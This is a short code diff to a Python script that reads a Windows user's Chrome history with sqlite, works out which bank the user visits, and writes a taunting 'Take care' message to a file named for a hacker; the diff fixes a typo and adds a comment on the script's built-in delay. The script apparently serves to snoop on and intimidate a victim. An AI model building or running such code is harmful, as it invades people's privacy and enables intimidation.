@@ -75,12 +75,12 @@ def check_bank_account(hacker_file, chrome_history):
                 break
         if his_bank:
             break
-    hacker_file.write("I also se that you save money on {}... Take care.\n".format(his_bank))
+    hacker_file.write("I also see that you save money on {}... Take care.\n".format(his_bank))
 
 
 def main():
     # Delay the app
-    delay_action()
+    delay_action() # you can comment this to run the script without delay or modify the time on line 29
     # Get windows Path
     user_path = get_user_path()
     # Read Chrome history with sqlite when possible
